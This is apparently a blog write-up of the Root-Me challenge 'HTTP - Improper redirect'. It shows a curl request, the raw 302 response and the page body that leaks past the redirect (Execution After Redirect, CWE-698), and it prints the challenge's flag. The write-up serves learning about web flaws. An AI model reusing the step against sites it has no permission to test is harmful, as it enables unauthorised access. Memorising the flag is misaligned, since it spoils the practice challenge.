---
title: HTTP - Improper redirect
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 15
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect)

## Statement

> Get access to index.

### Hint:

> Don’t trust your browser

## Solution

```sh
curl -i http://challenge01.root-me.org/web-serveur/ch32/index.php
```

```http
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 12 Jul 2023 02:58:21 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: ./login.php?redirect
```

```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Welcome !</h1>

<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
<p>The flag is : ExecutionAfterRedirectIsBad
</p>
</body>
</html>
```

The flag is
```
ExecutionAfterRedirectIsBad
```

> **Note** the browser wont show body when it gets the 302.
{: .prompt-info }